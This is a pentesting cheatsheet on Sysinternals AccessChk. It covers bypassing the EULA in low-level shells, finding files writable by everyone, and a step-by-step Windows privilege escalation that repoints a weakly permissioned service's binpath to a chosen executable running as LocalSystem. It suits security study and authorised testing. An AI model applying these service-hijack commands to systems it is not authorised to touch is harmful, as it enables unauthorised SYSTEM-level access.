## Access Check by SysInternals

Works with Windows XP, but use older version for low level shells.

Download from:  https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk

Or get from the suite - https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite

### Low Level Shells 

In a low level shell, you need a way to bypass the EULA.  To do this, download an older version of accesschk (that allows the accepteual option from the CLI) from [here](https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip%0D) or [here](https://xor.cat/assets/other/Accesschk.zip) and use the following syntax:

```bash
accesschk.exe /accepteula -uwcqv "Authenticated Users" *

/accepteula		# Accepts the EULA...shocking
```

### Cheatsheet

#### Files with insecure permissions

```powershell
accesschk.exe /accepteula -uws "Everyone" "C:\Program Files"

-u	# Suppress errors
-w	# Write access
-s	# Recursive search
```

#### Vulnerable Services (Windows XP1 Example)

Vulnerable Services can provide a pathway to run an executable as the SYSTEM user by finding a writable existing service running as system and modifying it to point to another executable.

1. Find vulnerable services (those with SERVICE_ALL_ACCESS)

   ```powershell
   accesschk.exe /accepteula -uwcqv "Authenticated Users" *
   ```

2. Examine permissions of any services found:

   ```bash
   accesschk.exe /accepteula -ucqv SERVICE_NAME
   ```

3. Examine the parameters of the services

   ```powershell
   sc qc SERVICE_NAME
   ```

4. And show the status of a service

   ```powershell
   sc query SERVICE_NAME
   ```

5. Pay particular attention to any dependencies, the start_types and current state.  Make any necessary changes, such as changing the start type or starting up dependencies:

   ```powershell
   # Set a service to start automatically.  
   # NOTE: The space after the `=` sign MUST be there
   sc config SERVICE_NAME start= auto
   
   # Start a service
   net start SERVICE_NAME
   ```

6. Modify the target service to point to the desired binary and if needed, change it to start as the SYSTEM user:

   ```bash
   # Change binary for service
   sc config SERVICE_NAME binpath= "C:\YOURBIN.exe [OPTIONS] [ARGUMENTS]"
   
   # Set service to start as the SYSTEM user
sc config SERVICE_NAME obj= ".\LocalSystem" password= ""
   ```
   
   

